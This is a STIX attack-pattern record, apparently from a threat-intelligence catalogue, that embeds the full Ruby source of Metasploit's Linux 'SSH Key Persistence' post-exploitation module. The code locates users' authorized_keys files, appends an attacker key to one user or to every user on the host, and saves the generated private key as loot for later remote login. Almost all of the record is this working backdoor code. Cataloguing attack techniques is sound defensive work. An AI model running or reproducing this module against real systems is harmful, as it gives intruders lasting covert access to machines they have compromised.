{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7ebac5c-b6fa-463e-b43e-6b728519dbb6",
    "created": "2024-08-14T16:33:13.579838Z",
    "modified": "2024-08-14T16:33:13.579841Z",
    "name": "SSH Key Persistence",
    "description": " This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/sshkey_persistence.rb",
            "external_id": "sshkey_persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'sshkey'\n\nclass MetasploitModule < Msf::Post\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SSH Key Persistence',\n        'Description' => %q{\n          This module will add an SSH key to a specified user (or all), to allow\n          remote login via SSH at any time.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die <mike@shorebreaksecurity.com>'\n        ],\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_separator\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'User to add SSH key to (Default: all users on box)' ]),\n        OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),\n        OptString.new('SSHD_CONFIG', [true, 'sshd_config file', '/etc/ssh/sshd_config' ]),\n        OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ])\n      ], self.class\n    )\n  end\n\n  def run\n    if session.type == 'meterpreter'\n      sep = session.fs.file.separator\n    else\n      # Guess, but it's probably right\n      sep = '/'\n    end\n    print_status('Checking SSH Permissions')\n    sshd_config = read_file(datastore['SSHD_CONFIG'])\n    /^PubkeyAuthentication\\s+(?<pub_key>yes|no)/ =~ sshd_config\n    if pub_key && pub_key == 'no'\n      print_error('Pubkey Authentication disabled')\n    elsif pub_key\n      vprint_good(\"Pubkey set to #{pub_key}\")\n    end\n    %r{^AuthorizedKeysFile\\s+(?<auth_key_file>[\\w%/.]+)} =~ sshd_config\n    if auth_key_file\n      auth_key_file = auth_key_file.gsub('%h', '')\n      auth_key_file = auth_key_file.gsub('%%', '%')\n      if auth_key_file.start_with? '/'\n        auth_key_file = auth_key_file[1..]\n      end\n    else\n      auth_key_file = '.ssh/authorized_keys'\n    end\n    print_status(\"Authorized Keys File: #{auth_key_file}\")\n\n    auth_key_folder = auth_key_file.split('/')[0...-1].join('/')\n    auth_key_file = auth_key_file.split('/')[-1]\n    if datastore['USERNAME'].nil?\n      print_status(\"Finding #{auth_key_folder} directories\")\n      paths = enum_user_directories.map { |d| d + \"/#{auth_key_folder}\" }\n    else\n      if datastore['USERNAME'] == 'root'\n        paths = [\"/#{datastore['USERNAME']}/#{auth_key_folder}\"]\n      else\n        paths = [\"/home/#{datastore['USERNAME']}/#{auth_key_folder}\"]\n      end\n      vprint_status(\"Added User SSH Path: #{paths.first}\")\n    end\n\n    if datastore['CREATESSHFOLDER'] == true\n      vprint_status(\"Attempting to create ssh folders that don't exist\")\n      paths.each do |p|\n        unless directory?(p)\n          print_status(\"Creating #{p} folder\")\n          cmd_exec(\"mkdir -m 700 -p #{p}\")\n        end\n      end\n    end\n\n    paths = paths.select { |d| directory?(d) }\n    if paths.nil? || paths.empty?\n      print_error(\"No users found with a #{auth_key_folder} directory\")\n      return\n    end\n    write_key(paths, auth_key_file, sep)\n  end\n\n  def write_key(paths, auth_key_file, sep)\n    if datastore['PUBKEY'].nil?\n      key = SSHKey.generate\n      our_pub_key = key.ssh_public_key\n      loot_path = store_loot('id_rsa', 'text/plain', session, key.private_key, 'ssh_id_rsa', 'OpenSSH Private Key File')\n      print_good(\"Storing new private key as #{loot_path}\")\n    else\n      our_pub_key = ::File.read(datastore['PUBKEY'])\n    end\n    paths.each do |path|\n      path.chomp!\n      authorized_keys = \"#{path}/#{auth_key_file}\"\n      print_status(\"Adding key to #{authorized_keys}\")\n      append_file(authorized_keys, \"\\n#{our_pub_key}\")\n      print_good('Key Added')\n      next unless datastore['PUBKEY'].nil?\n\n      path_array = path.split(sep)\n      path_array.pop\n      user = path_array.pop\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :ssh_key,\n        private_data: key.private_key.to_s,\n        username: user,\n        workspace_id: myworkspace_id\n      }\n\n      create_credential(credential_data)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}